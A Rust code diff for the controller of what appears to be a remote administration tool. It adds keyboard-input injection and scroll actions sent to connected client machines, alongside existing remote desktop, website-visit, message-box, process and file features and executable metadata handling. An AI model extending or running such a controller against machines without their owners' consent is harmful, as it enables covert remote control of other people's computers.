@@ -20,7 +20,7 @@ use tauri::AppHandle;
 
 use once_cell::sync::OnceCell;
 
-use common::packets::{RemoteDesktopConfig, MouseClickData, VisitWebsiteData, MessageBoxData, Process, FileData};
+use common::packets::{RemoteDesktopConfig, MouseClickData, KeyboardInputData, VisitWebsiteData, MessageBoxData, Process, FileData};
 
 use object::{ Object, ObjectSection };
 use std::fs::{ File as FsFile };
@@ -141,15 +141,11 @@ pub async fn stop_server(tauri_state: State<'_, SharedTauriState>, app_handle: A
         if let Some(listener_task) = tauri_state.listener_task.take() {
             listener_task.abort();
         }
-
-
-        if let Some(listener_task) = tauri_state.listener_task.take() {
-            listener_task.abort();
-        }
         
         tauri_state.channel_tx = OnceCell::new();
         tauri_state.server_task = None;
         tauri_state.listener_task = None;
+        tauri_state.running = false;
     }
 
     Ok("true".to_string())
@@ -425,6 +421,8 @@ pub async fn send_mouse_click(
     x: i32,
     y: i32,
     click_type: i32,
+    action_type: i32,
+    scroll_amount: Option<i32>,
     tauri_state: State<'_, SharedTauriState>,
     app_handle: AppHandle
 ) -> Result<String, String> {
@@ -438,6 +436,8 @@ pub async fn send_mouse_click(
         x: x as i32,
         y: y as i32,
         click_type,
+        action_type,
+        scroll_amount: scroll_amount.unwrap_or(0),
     }))
         .await
         .map_err(|e| e.to_string())?;
@@ -793,4 +793,35 @@ pub fn get_assembly_info(exe_path: &str, rcedit_path: &str) -> Result<AssemblyIn
         assembly_product_version: get_value("ProductVersion"),
         assembly_file_version: get_value("FileVersion"),
     })
+}
+
+#[tauri::command]
+pub async fn send_keyboard_input(
+    addr: &str,
+    key_code: u32,
+    character: &str,
+    is_keydown: bool,
+    shift_pressed: bool,
+    ctrl_pressed: bool,
+    caps_lock: bool,
+    tauri_state: State<'_, SharedTauriState>,
+    app_handle: AppHandle
+) -> Result<String, String> {
+    let socket_addr = addr.parse()
+    .map_err(|e| format!("Invalid socket address: {}", e))?;
+
+    let channel_tx = get_channel_tx(tauri_state, app_handle).await?;
+
+    channel_tx.send(ServerCommand::KeyboardInput(socket_addr, KeyboardInputData {
+        key_code,
+        character: character.to_string(),
+        is_keydown,
+        shift_pressed,
+        ctrl_pressed,
+        caps_lock,
+    }))
+        .await
+        .map_err(|e| e.to_string())?;
+
+    Ok("Keyboard input sent".to_string())
 }
